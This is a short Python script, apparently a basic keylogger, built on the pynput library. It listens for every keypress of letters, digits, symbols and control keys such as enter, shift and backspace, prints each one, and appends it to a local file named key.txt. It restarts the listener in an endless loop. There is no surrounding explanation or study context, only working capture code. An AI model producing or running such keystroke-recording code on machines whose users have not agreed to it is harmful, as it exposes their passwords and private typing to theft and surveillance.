from pynput import keyboard
#string = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&*()_+/*-.,=[];"' + "'"
#print(list(string))
def save_key(k):
    file = open("key.txt", "a")
    file.write(k + "\n");
    file.close() 
def on_press(key):
    try: k = key.char 
    except: k = key.name 
    if key == keyboard.Key.esc: return False 
    if str(k) in ['A', 'B', 'C', 'D', 'E', 'F', 'G',
     'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
     'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
     'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2'
     ,'3', '4', '5', '6', '7', '8', '9', '~', '!',
     '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '/', '*', '-', '.', ',', '=', '[', ']', ';', '"', "'",'left'
     ,'right','enter','shift','backspace','tab','caps_lock','space','up','down','num_lock']: 
        print('Key pressed: ' + k)
        save_key(k);
        return False 
while True :
	lis = keyboard.Listener(on_press=on_press)
	lis.start() 
	lis.join() 